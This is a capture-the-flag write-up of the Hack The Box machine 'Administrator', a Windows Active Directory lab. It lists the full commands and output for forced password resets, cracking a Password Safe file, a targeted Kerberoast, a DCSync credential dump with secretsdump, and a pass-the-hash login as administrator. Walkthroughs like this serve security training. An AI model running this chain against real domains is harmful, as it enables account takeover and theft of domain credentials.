---
title: "Administrator"
date: 2025-08-23 21:31:00 +0500
categories: [Boxes]
tags: [HTB, Box, Windows, Medium, Active Directory, Force Change Password, pwsafe, GenericWrite, TargetedKerberoas, GenericAll, GetChanges, GetChangesAll, DCSync Attack, impacket-secretsdump] 
---

## Box Credentials

As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich

## Recon

### Port Scanning

```bash
rustscan -a 10.10.11.42 --ulimit 5000

PORT      STATE SERVICE        REASON
21/tcp    open  ftp            syn-ack ttl 127
53/tcp    open  domain         syn-ack ttl 127
88/tcp    open  kerberos-sec   syn-ack ttl 127
135/tcp   open  msrpc          syn-ack ttl 127
139/tcp   open  netbios-ssn    syn-ack ttl 127
389/tcp   open  ldap           syn-ack ttl 127
445/tcp   open  microsoft-ds   syn-ack ttl 127
464/tcp   open  kpasswd5       syn-ack ttl 127
593/tcp   open  http-rpc-epmap syn-ack ttl 127
3268/tcp  open  globalcatLDAP  syn-ack ttl 127
5985/tcp  open  wsman          syn-ack ttl 127
9389/tcp  open  adws           syn-ack ttl 127
47001/tcp open  winrm          syn-ack ttl 127
49664/tcp open  unknown        syn-ack ttl 127
49665/tcp open  unknown        syn-ack ttl 127
49666/tcp open  unknown        syn-ack ttl 127
49667/tcp open  unknown        syn-ack ttl 127
49668/tcp open  unknown        syn-ack ttl 127
55985/tcp open  unknown        syn-ack ttl 127
61391/tcp open  unknown        syn-ack ttl 127
61396/tcp open  unknown        syn-ack ttl 127
61407/tcp open  unknown        syn-ack ttl 127
61418/tcp open  unknown        syn-ack ttl 127
```

Script and Version scan:

```bash
sudo nmap 10.10.11.42 -p21,53,88,135,139,389,445,464,593,3268,5985,9389,47001 -sC -sV -oN administrator.txt
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 21:40 PKT
Nmap scan report for 10.10.11.42
Host is up (0.22s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-23 23:16:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-23T23:16:24
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h35m11s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.88 seconds
```

We will fix the clockskew with `ntpdate`. The box is AD, domain being `administrator.htb`. We have creds. We have FTP, SMB service for initial enumeration.

FTP and SMB didn't yield much, we jumped straight to bloodhound.

### Bloodhound

- Olivia has `GenericAll` over Michael.
- We could either abuse it with targetedKerberoast, Shadow Credentials Attack, or simply Force Change Password.

![alt text](/assets/images/administrator-bloodhound.png)

### Force Change Password Michael

```bash
bloodyAD --dc-ip 10.10.11.42 -d administrator.htb -u Olivia -p 'ichliebedich' set password michael 'Password123!'                           
[+] Password changed successfully!
```

![alt text](/assets/images/administrator-michael.png)

Michael can Force Change Password of benjamin. 

### Force Change Password Benjamin

```bash
bloodyAD --dc-ip 10.10.11.42 -d administrator.htb -u michael -p 'Password123!' set password benjamin 'Password123!'
[+] Password changed successfully!
```

On further enumerating with benjamin user we can access FTP:

```bash
netexec ftp 10.10.11.42 -u benjamin -p 'Password123!'      
FTP         10.10.11.42     21     10.10.11.42      [+] benjamin:Password123!
```

## Foothold

### FTP as Benjamin

```bash
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||61696|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
```

### pwsafe2john

We need the master password to access the psafe file:

```bash
/usr/bin/pwsafe2john Backup.psafe3 > psafe.hash
```

```bash
john --format=pwsafe -w=/usr/share/wordlists/rockyou.txt psafe.hash              
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 SSE2 4x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-08-24 05:16) 1.492g/s 9170p/s 9170c/s 9170C/s Liverpool..iheartyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### pwsafe

Let's access the file with pwsafe.

![alt text](/assets/images/administrator-pwsafe.png)

```
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

We have three set of creds.

Emily is able to winrm.

### Shell as emily

```bash
evil-winrm -i 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb           
zsh: /usr/local/bin/evil-winrm: bad interpreter: /usr/bin/ruby3.1: no such file or directory
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents>
```

Emily has GenericWrite over Ethan.

![alt text](/assets/images/administrator-emily.png)

## Privilege Escalation

### Emily GenericWrite Ethan

We could either do a targetedKerberoast or Shadow Credentials attack.

#### TargetedKerberoast

```bash
python3 targetedKerberoast.py -v -d 'administrator.htb' --dc-ip 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$b957060318f76e99b490484017618128$909c5203b807962c275238b2e37305f350fe4bcc6b56c600dca74d25bfec7fa72ef3dec2e9af6afe23495ba0080cc7240ddf4d9bc8bb38178b546e1433588612d31be73f563076d77e1f25ac59c44721696b78c4c59db28fa3d1d7f52396574502e7ba25d92477c02c7a56fc02d76597a0faa2260c902c7317e13feddc08412a6c9f8f26b3b92c8ec7a4e239bdf2eef71f72f56ddfe8666b96acc33d5dde7b5fd10fd9c132962ca914b6af1980ae9bce233ef29e009bdb3241e37f80e5fe0126969c90665ce7023aabd4ddd9a07ee9b3eeccfde17080c51701bd5c2f52a62c38d6b9b4ad9692489bf650bad5e32a20a7b61f00842517fdf78f4e5ef72aadc3dcf5eb9c933776b916f76871e2911fdc497ecad1bf413ac3ca1a8d7c2221a86c090c93ec2c330411f48e8822282e7543b7c0f93cc6bc90c971fa043a472a6fb003cd2c1a8ac904bcb9a7e406c057c35a84508351db37ad45b3ad2437e7879e010ecb94bc217f083d4357610af223bccf88b8854ad235e40226a2bc5e512a30267c26497fa65e81f24fc173025bc3cb8808e9877610e2c4ba8a10f5d84481e0bd487b3d581ec79e1aec537752d887be2dd971520187204bf455e9e41ade29c144a583e72ea4d61ada35e8b3784788c49c80a982a0ad8caceab0b116252bc6cc910838dca45bd4d4e6d462b2f08b62bda3cb2364acd2412f717b3a851c2f8a4824bfe2fa30c0fe4984afc836b37d282f52df561efb7c11d28eb64cffb299520d83b26ab50a147d550e66a8debf091bb77e0db79167c8672088f4d0c27be7ad4c8becd30e44b383bfd7343859e81aefb9c351232fa85406d983eb1b5bcd36ca9b8a60555cfbf9754482902bf09210f6472fffc8053002197ca919a7ca32b910170f83a8828a2f8b6951f762e662969c53d461104e726884f2c7975b83762b6b27f682579985df1a6696d08c1b1c3cf10bf596e4e456bf375a1c449d1ee31788bf3037d93d84b44a41cda65e63c055e3cee40bb4adfa225fb15e9166a8a1aebfc9fa5203c248becafdc4d10dd5a1c9d70e5a2636fec0b6d9c55fec87946c89a11ffce94dc3bed63cb0c04f897a55bfb9433acdbb043ab1c2735ce748a9e31d7a41c1857f7f27685c91e509722352cfab92ade51254e6012296171250dbc5fa357f80e95cdeb0f4ae40b607ec0f5a02a6fc0ff56ff71dcf4b2e1bc72c7bc3f0830ce1591b7078b64fbde2a6df33b917f0c49dfefe32fa794274ef915ccbd826089c9d2139e42809eaa67ed02eb1109ce738fa0a3cdd6ae3856a12ecc457013df96d7d75409f296042d88c555c7f76b1a7c61b7a7efa4335aa004080b0ee27be938c9700240741bd8bfa76c795ac53ca1ef6d2225c9e87be1307419b81ddcdc7c3483f61452df2d679e571984f526ffec869f284af7b4093591b7330076d2d72eafda7665ca4b04590c8c919b966ad007d5e4e586ae85ff08a89f87af61e354192c9fdd63b8879b481f059fcc85e0b2a25ba75cbc46dc459ee94bcdf4d2aff0f2aa4dc
[VERBOSE] SPN removed successfully for (ethan)
                                                                                                                                                           
┌──(kali㉿vm-kali)-[~/htb/administrator]
└─$ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt ethan.hash     
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
limpbizkit       (?)     
1g 0:00:00:00 DONE (2025-08-24 05:39) 25.00g/s 134400p/s 134400c/s 134400C/s Liverpool..ginuwine
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`ethan:limpbizkit`

### Enumeration

Ethan has 3 rights over Administrator.

![alt text](/assets/images/administrator-ethan.png)

- `GetChanges` and `GetChangesAll` open up the path for a DCSync Attack.

#### What is a DCSync Attack?

DCSync leverages the Directory Replication Service Remote Protocol (MS-DRSR), which domain controllers use to synchronize Active Directory data between each other. When a domain controller needs to replicate changes, it requests specific objects and attributes from other domain controllers using this protocol.

The attack works by impersonating a domain controller and requesting replication of user account objects, including their password hashes. The target domain controller, believing it's communicating with a legitimate peer, responds with the requested credential data.

### Secretsdump (DCSync Attack)

```bash
impacket-secretsdump administrator.htb/ethan:limpbizkit@10.10.11.42
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:7a206ee05e894781b99a0175a7fe6f7e1242913b2ab72d0a797cc45968451142
administrator.htb\michael:aes128-cts-hmac-sha1-96:b0f3074aa15482dc8b74937febfa9c7e
administrator.htb\michael:des-cbc-md5:2586dc58c47c61f7
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:36cfe045bc49eda752ca34dd62d77285b82b8c8180c3846a09e4cb13468433a9
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:2cca9575bfa7174d8f3527c7e77526e5
administrator.htb\benjamin:des-cbc-md5:49376b671fadf4d6
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up...
```

### Shell as Admin

```bash
evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
zsh: /usr/local/bin/evil-winrm: bad interpreter: /usr/bin/ruby3.1: no such file or directory
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

---
